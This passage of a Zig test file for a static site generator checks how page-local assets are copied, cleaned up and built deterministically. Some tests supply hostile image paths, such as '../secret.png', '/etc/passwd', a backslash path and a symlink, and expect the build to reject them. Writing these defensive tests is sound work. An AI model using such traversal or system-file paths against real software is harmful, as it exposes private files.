    try std.testing.expectError(error.FileNotFound, cwd.access(io, stage, .{}));
}

test "content-local assets: rejects traversal outside tree" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const work = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/cla-hostile", .{tmp.sub_path});
    defer gpa.free(work);
    try cwd.createDirPath(io, work);

    try writeTreeFile(io, work, "content/guides/intro.md",
        \\---
        \\title: Intro
        \\---
        \\
        \\![x](../secret.png)
        \\
    );
    try writeTreeFile(io, work, "content/secret.png", "nope");
    try writeTreeFile(io, work, "content/guides/intro.assets/ok.svg", "ok");
    try writeTreeFile(io, work, "layouts/main.html", "<html>{{content}}</html>");

    const content = try std.fmt.allocPrint(gpa, "{s}/content", .{work});
    defer gpa.free(content);
    const layout = try std.fmt.allocPrint(gpa, "{s}/layouts/main.html", .{work});
    defer gpa.free(layout);
    const dist = try std.fmt.allocPrint(gpa, "{s}/dist", .{work});
    defer gpa.free(dist);

    try std.testing.expectError(error.AssetFailed, compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
    }));
}

test "content-local assets: rejects absolute and backslash destinations" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const work = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/cla-abs", .{tmp.sub_path});
    defer gpa.free(work);
    try cwd.createDirPath(io, work);
    try writeTreeFile(io, work, "layouts/main.html", "<html>{{content}}</html>");
    try writeTreeFile(io, work, "content/index.assets/x.svg", "x");

    const content = try std.fmt.allocPrint(gpa, "{s}/content", .{work});
    defer gpa.free(content);
    const layout = try std.fmt.allocPrint(gpa, "{s}/layouts/main.html", .{work});
    defer gpa.free(layout);
    const dist = try std.fmt.allocPrint(gpa, "{s}/dist", .{work});
    defer gpa.free(dist);

    try writeTreeFile(io, work, "content/index.md",
        \\---
        \\title: H
        \\---
        \\![x](/etc/passwd)
        \\
    );
    try std.testing.expectError(error.AssetFailed, compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
    }));

    try writeTreeFile(io, work, "content/index.md",
        \\---
        \\title: H
        \\---
        \\![x](index.assets\x.svg)
        \\
    );
    try std.testing.expectError(error.AssetFailed, compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
    }));
}

test "content-local assets: rejects symlink leaf when host allows" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const work = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/cla-symlink", .{tmp.sub_path});
    defer gpa.free(work);
    try cwd.createDirPath(io, work);

    try writeTreeFile(io, work, "content/index.md",
        \\---
        \\title: H
        \\---
        \\![x](index.assets/link.svg)
        \\
    );
    try writeTreeFile(io, work, "content/index.assets/real.svg", "real");
    try writeTreeFile(io, work, "layouts/main.html", "<html>{{content}}</html>");

    const assets_dir = try std.fmt.allocPrint(gpa, "{s}/content/index.assets", .{work});
    defer gpa.free(assets_dir);
    var adir = try cwd.openDir(io, assets_dir, .{});
    defer adir.close(io);
    adir.symLink(io, "real.svg", "link.svg", .{}) catch |err| switch (err) {
        error.AccessDenied, error.PermissionDenied => return,
        else => return err,
    };

    const content = try std.fmt.allocPrint(gpa, "{s}/content", .{work});
    defer gpa.free(content);
    const layout = try std.fmt.allocPrint(gpa, "{s}/layouts/main.html", .{work});
    defer gpa.free(layout);
    const dist = try std.fmt.allocPrint(gpa, "{s}/dist", .{work});
    defer gpa.free(dist);

    try std.testing.expectError(error.AssetSymlink, compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
    }));
}

test "content-local assets: stale cleanup and theme isolation" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const work = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/cla-stale", .{tmp.sub_path});
    defer gpa.free(work);
    try cwd.createDirPath(io, work);

    try writeTreeFile(io, work, "content/index.md",
        \\---
        \\title: H
        \\---
        \\![a](index.assets/keep.svg)
        \\
    );
    try writeTreeFile(io, work, "content/index.assets/keep.svg", "keep");
    try writeTreeFile(io, work, "content/index.assets/drop.svg", "drop");
    try writeTreeFile(io, work, "theme/layouts/main.html",
        \\<html><link href="{{asset-url assets/css/docs.css}}">{{content}}</html>
    );
    try writeTreeFile(io, work, "theme/assets/css/docs.css", "theme-css");

    const content = try std.fmt.allocPrint(gpa, "{s}/content", .{work});
    defer gpa.free(content);
    const layout = try std.fmt.allocPrint(gpa, "{s}/theme/layouts/main.html", .{work});
    defer gpa.free(layout);
    const dist = try std.fmt.allocPrint(gpa, "{s}/dist", .{work});
    defer gpa.free(dist);

    _ = try compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
    });

    const drop_src = try std.fmt.allocPrint(gpa, "{s}/content/index.assets/drop.svg", .{work});
    defer gpa.free(drop_src);
    try cwd.deleteFile(io, drop_src);

    _ = try compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
    });

    const drop_out = try std.fmt.allocPrint(gpa, "{s}/index.assets/drop.svg", .{dist});
    defer gpa.free(drop_out);
    try std.testing.expectError(error.FileNotFound, cwd.access(io, drop_out, .{}));

    const theme_path = try std.fmt.allocPrint(gpa, "{s}/assets/css/docs.css", .{dist});
    defer gpa.free(theme_path);
    const theme_bytes = try readFileAlloc(io, cwd, theme_path, gpa);
    defer gpa.free(theme_bytes);
    try std.testing.expectEqualStrings("theme-css", theme_bytes);

    const keep_path = try std.fmt.allocPrint(gpa, "{s}/index.assets/keep.svg", .{dist});
    defer gpa.free(keep_path);
    const keep = try readFileAlloc(io, cwd, keep_path, gpa);
    defer gpa.free(keep);
    try std.testing.expectEqualStrings("keep", keep);
}

test "content-local assets: two builds are byte-identical" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const work = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/cla-det", .{tmp.sub_path});
    defer gpa.free(work);
    try cwd.createDirPath(io, work);

    try writeTreeFile(io, work, "content/index.md",
        \\---
        \\title: H
        \\---
        \\![d](index.assets/z.svg)
        \\![d2](index.assets/a.svg)
        \\
    );
    try writeTreeFile(io, work, "content/index.assets/z.svg", "z");
    try writeTreeFile(io, work, "content/index.assets/a.svg", "a");
    try writeTreeFile(io, work, "layouts/main.html", "<html>{{content}}</html>");

    const content = try std.fmt.allocPrint(gpa, "{s}/content", .{work});
    defer gpa.free(content);
    const layout = try std.fmt.allocPrint(gpa, "{s}/layouts/main.html", .{work});
    defer gpa.free(layout);
    const dist1 = try std.fmt.allocPrint(gpa, "{s}/d1", .{work});
    defer gpa.free(dist1);
    const dist2 = try std.fmt.allocPrint(gpa, "{s}/d2", .{work});
    defer gpa.free(dist2);

    _ = try compileHtmlSite(io, gpa, .{ .content_root = content, .dist_dir = dist1, .layout_path = layout, .quiet = true });
    _ = try compileHtmlSite(io, gpa, .{ .content_root = content, .dist_dir = dist2, .layout_path = layout, .quiet = true });

    const html1_path = try std.fmt.allocPrint(gpa, "{s}/index.html", .{dist1});
    defer gpa.free(html1_path);
    const html2_path = try std.fmt.allocPrint(gpa, "{s}/index.html", .{dist2});
    defer gpa.free(html2_path);
    const html1 = try readFileAlloc(io, cwd, html1_path, gpa);
    defer gpa.free(html1);
    const html2 = try readFileAlloc(io, cwd, html2_path, gpa);
    defer gpa.free(html2);
    try std.testing.expectEqualStrings(html1, html2);

    const a1p = try std.fmt.allocPrint(gpa, "{s}/index.assets/a.svg", .{dist1});
    defer gpa.free(a1p);
    const a2p = try std.fmt.allocPrint(gpa, "{s}/index.assets/a.svg", .{dist2});
    defer gpa.free(a2p);
    const a1 = try readFileAlloc(io, cwd, a1p, gpa);
    defer gpa.free(a1);
    const a2 = try readFileAlloc(io, cwd, a2p, gpa);
    defer gpa.free(a2);
    try std.testing.expectEqualStrings(a1, a2);
}

// =============================================================================
// Optional example: reference theme (themes/reference + examples/reference-site)
// =============================================================================

test "example reference-theme: layouts, components, page-local assets" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const dist = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/boris-example-reference-theme", .{tmp.sub_path});
    defer gpa.free(dist);

    const rules = [_]layout_select.LayoutRule{
        .{ .kind = .id, .value = "index", .layout_path = "themes/reference/layouts/home.html" },
        .{ .kind = .role, .value = "trunk", .layout_path = "themes/reference/layouts/section.html" },
    };

    const stats = try compileHtmlSite(io, gpa, .{
        .content_root = "examples/reference-site/content",
        .dist_dir = dist,
        .layout_path = "themes/reference/layouts/main.html",
        .layout_rules = &rules,
        .quiet = true,
    });
    try std.testing.expectEqual(@as(usize, 6), stats.pages_written);

    const index_path = try std.fmt.allocPrint(gpa, "{s}/index.html", .{dist});
    defer gpa.free(index_path);
    const index_html = try readFileAlloc(io, cwd, index_path, gpa);
    defer gpa.free(index_html);
    try std.testing.expect(std.mem.indexOf(u8, index_html, "data-layout=\"home\"") != null);
    try std.testing.expect(std.mem.indexOf(u8, index_html, "href=\"assets/css/reference.css\"") != null);
    try std.testing.expect(std.mem.indexOf(u8, index_html, "index.assets/rhythm-diagram.svg") != null);
    try std.testing.expect(std.mem.indexOf(u8, index_html, "site-nav") != null);
    try std.testing.expect(std.mem.indexOf(u8, index_html, "admonition--tip") != null);
    try std.testing.expect(std.mem.indexOf(u8, index_html, "https://") == null);
    try std.testing.expect(std.mem.indexOf(u8, index_html, "http://") == null);

    const guides_path = try std.fmt.allocPrint(gpa, "{s}/guides.html", .{dist});
    defer gpa.free(guides_path);
    const guides_html = try readFileAlloc(io, cwd, guides_path, gpa);
    defer gpa.free(guides_html);
    try std.testing.expect(std.mem.indexOf(u8, guides_html, "data-layout=\"section\"") != null);
    try std.testing.expect(std.mem.indexOf(u8, guides_html, "page-children") != null);

    const components_path = try std.fmt.allocPrint(gpa, "{s}/guides/components.html", .{dist});
    defer gpa.free(components_path);
    const components_html = try readFileAlloc(io, cwd, components_path, gpa);
    defer gpa.free(components_html);
    try std.testing.expect(std.mem.indexOf(u8, components_html, "data-layout=\"main\"") != null);
    try std.testing.expect(std.mem.indexOf(u8, components_html, "page-toc") != null);
    try std.testing.expect(std.mem.indexOf(u8, components_html, "class=\"details\"") != null);
    try std.testing.expect(std.mem.indexOf(u8, components_html, "components.assets/component-flow.svg") != null);
    try std.testing.expect(std.mem.indexOf(u8, components_html, "href=\"../assets/css/reference.css\"") != null);

    const theme_css_out = try std.fmt.allocPrint(gpa, "{s}/assets/css/reference.css", .{dist});
    defer gpa.free(theme_css_out);
    const copied_css = try readFileAlloc(io, cwd, theme_css_out, gpa);
    defer gpa.free(copied_css);
    const theme_css = try readFileAlloc(io, cwd, "themes/reference/assets/css/reference.css", gpa);
    defer gpa.free(theme_css);
    try std.testing.expectEqualStrings(theme_css, copied_css);

    const local_asset = try std.fmt.allocPrint(gpa, "{s}/index.assets/rhythm-diagram.svg", .{dist});
    defer gpa.free(local_asset);
    const local_bytes = try readFileAlloc(io, cwd, local_asset, gpa);
    defer gpa.free(local_bytes);
    try std.testing.expect(local_bytes.len > 0);
}
